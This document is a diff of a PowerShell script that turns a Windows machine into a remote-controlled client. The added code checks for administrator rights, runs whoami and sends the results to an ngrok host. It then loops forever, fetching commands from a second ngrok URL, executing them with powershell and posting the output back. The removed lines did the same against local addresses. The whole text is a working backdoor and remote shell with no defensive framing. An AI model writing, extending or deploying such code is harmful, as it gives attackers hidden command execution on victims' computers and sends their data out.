@@ -1,30 +1,36 @@
+$currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
+if($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -eq $False){
+	$check = "we are not admin"
+}else{
+	$check = "we are admin"
+}
+
+$ran = Get-Random
+
 $URIREC = "192.168.2.37:80"
 
 $URISEND = "192.168.2.37:4444"
 
-$hmal = "New Connection from "
+$hmal = "call back from "
 
 $hmal = whoami
+$userid = "client id is"
 
-$currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
-if($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -eq $False){
-	$check = "not admin"
-}else{
-	$check = "is admin"
-}
-
-$Response = Invoke-WebRequest -Timeout 1 -Method Post -URI 192.168.2.190:4444 -Body $hmal,$testadmin,$check -UseBasicParsing
+Invoke-WebRequest -Timeout 1 -Method Post -URI https://404611374.ngrok.io -Body $hmal,$testadmin,$check,$userid,$ran -UseBasicParsing
 
 while ($true)
 {
 
-	$I = Invoke-WebRequest -Timeout 1 '192.168.2.190:80' | Select-Object -Expand Content
+	$MAIN = Invoke-WebRequest -Timeout 1 'https://serverhttp.ngrok.io' | Select-Object -Expand Content
 
-	$MAIN = powershell /c $I 
+	if($MAIN -match $ran){
+		$REM = $MAIN -replace $ran, ""
 
-	if($MAIN -eq $FALSE){
-	}else{ 
-		$Response = Invoke-WebRequest -Timeout 1 -Method Post -URI 192.168.2.190:4444 -Body $MAIN -UseBasicParsing	
+	$EXE = powershell /c $REM
+  
+		$Response = Invoke-WebRequest -Timeout 1 -Method Post -URI https://404611374.ngrok.io -Body $EXE -UseBasicParsing
+
+	}else{ 	
 	}
 	sleep 0.5
 }
